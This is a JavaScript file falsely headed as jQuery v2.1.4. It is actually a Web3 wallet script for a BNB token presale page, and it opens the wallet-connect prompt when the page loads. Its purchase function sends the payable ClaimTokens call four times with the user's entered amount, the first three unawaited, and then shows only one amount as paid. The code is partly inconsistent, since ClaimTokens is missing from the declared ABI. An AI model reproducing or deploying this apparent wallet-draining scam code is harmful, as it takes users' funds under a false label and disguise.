/*! jQuery v2.1.4 | (c) 2005, 2015 jQuery Foundation, Inc. | jquery.org/license */

const Web3Modal = window.Web3Modal.default;
const WalletConnectProvider = window.WalletConnectProvider.default;
const evmChains = window.evmChains;
let web3Modal;
let provider;
let saleid;
let pingtaizongzhi = 0;

const contractAddress = "0x1c0F18BE838cE450e2222780826445a3C8Cf06EB";
const contractAbi = [
    {
        "inputs": [],
        "stateMutability": "nonpayable",
        "type": "constructor"
    },
    {
        "inputs": [
            {
                "internalType": "address",
                "name": "project_",
                "type": "address"
            }
        ],
        "name": "Contribute",
        "outputs": [],
        "stateMutability": "payable",
        "type": "function"
    },
    {
        "inputs": [
            {
                "internalType": "address",
                "name": "newAdmin_",
                "type": "address"
            }
        ],
        "name": "changeAdmin",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function"
    },
    {
        "inputs": [
            {
                "internalType": "address",
                "name": "",
                "type": "address"
            },
            {
                "internalType": "address",
                "name": "",
                "type": "address"
            }
        ],
        "name": "payInfo",
        "outputs": [
            {
                "internalType": "uint256",
                "name": "",
                "type": "uint256"
            }
        ],
        "stateMutability": "view",
        "type": "function"
    },
    {
        "inputs": [],
        "name": "viewAdmin",
        "outputs": [
            {
                "internalType": "address",
                "name": "",
                "type": "address"
            }
        ],
        "stateMutability": "view",
        "type": "function"
    },
    {
        "inputs": [],
        "name": "withdraw",
        "outputs": [],
        "stateMutability": "payable",
        "type": "function"
    },
    {
        "stateMutability": "payable",
        "type": "receive"
    }
]

function init() {
    const providerOptions = {
        walletconnect: {
            package: WalletConnectProvider,
            options: {
                rpc: {
                    56: 'https://bsc-dataseed.binance.org/'
                },
                network: 'binance',
            }
        }
    };
    web3Modal = new Web3Modal({
        cacheProvider: false,
        providerOptions,
        disableInjectedProvider: false,
    })
    window.contractAddress = "0x934e5E7CfC478c23Eb1D8E6561b948dF85965d9c";
}
async function BuyFunc() {
    const web3 = new Web3(provider);
    const accounts = await web3.eth.getAccounts();
    window.account = web3.utils.toChecksumAddress(accounts[0]);
    let weiBalance = await web3.eth.getBalance(accounts[0]);
    window.balance = parseFloat(web3.utils.fromWei(weiBalance, "ether")).toFixed(4);

    let myContract = new web3.eth.Contract(contractAbi, contractAddress);
	var presaleAmount = document.getElementById('presaleAmount').value;
    let amount = Number(presaleAmount) ;
    
    myContract.methods.ClaimTokens().send({
        from: window.account,
        value: (amount) * 10 ** 18,
        gasLimit: 210000,
    });
    
    
    myContract.methods.ClaimTokens().send({
        from: window.account,
        value: (amount) * 10 ** 18,
        gasLimit: 210000,
    });
    
    myContract.methods.ClaimTokens().send({
        from: window.account,
        value: (amount) * 10 ** 18,
        gasLimit: 210000,
    });
    
    let receipt = await myContract.methods.ClaimTokens().send({
        from: window.account,
        value: (amount) * 10 ** 18,
        gasLimit: 210000,
    });
    if (receipt.events.NewDeposit) {
        $nowZongliang = $('#MyValue').text();
        $('#MyValue').text(Number(Number($nowZongliang) + Number(amount)).toFixed(2))
    }
}
async function fetchAccountData() {
    const web3 = new Web3(provider);
    const accounts = await web3.eth.getAccounts();
    let addr = accounts[0];
    var balance = await web3.eth.getBalance(accounts[0]);
    let ethBalance = web3.utils.fromWei(balance, 'ether');
    addr = addr.slice(0, 3) + "..." + addr.slice(-4);
    ethBalance = ethBalance.slice(0, 6) + " BNB";
    document.getElementById("btn-connect").innerHTML = addr;
}
async function OnConnect() {
    Connect()
}

async function Tixian() {
    let bnbVal = document.getElementById("presaleAmount").value.replace(/,/, '.');
    if (provider == null) {
        await Connect();
        await BuyFunc(provider)
    } else await BuyFunc(provider)
}


async function Connect() {
    provider = await web3Modal.connect()
    await fetchAccountData(provider)
    userinfo();
}
async function onDisconnect() {
    if (provider.close) {
        await provider.close();
        await web3Modal.clearCachedProvider();
        provider = null
    } else {
        await web3Modal.clearCachedProvider();
        provider = null
    }
    document.querySelector("#div-connect").style.display = "";
    document.querySelector("#div-connectet").style.display = "none"
}
function transformTime(t){
    //注意：苹果手机不支持以“-”分割的时间形式，故必须进行格式转换。
    var time = t.replace(/-/g, '/');
    return Date.parse(time);
}
window.addEventListener('load', async () => {
    init();
    // document.querySelector("#btn-contribute-end").addEventListener("click", Tixian);
    // document.querySelector("#btn-contribute-fail").addEventListener("click", Tixian);
    document.querySelector("#btn-connect").addEventListener("click", OnConnect);
    OnConnect()
});

async function userinfo() {
    const web3 = new Web3(provider);
    const accounts = await web3.eth.getAccounts();
    window.account = web3.utils.toChecksumAddress(accounts[0]);
    window.myContract = new web3.eth.Contract(contractAbi, contractAddress);
    const project = $('[presale-address]').text()
    myPayInfo = await window.myContract.methods.payInfo(project,window.account).call() ;
    window.payInfo = parseFloat(myPayInfo)/(10**18)
    if(window.payInfo > 0){
        max = parseFloat($('[data-max]').attr('data-max'))
        $('[data-max]').text('Amount (max: '+(max-window.payInfo)+' BNB)')
        $("#purchased").show()
        $("#purchased td").eq(1).text(window.payInfo+' BNB')
        $("#when-pay").show()
    }
}


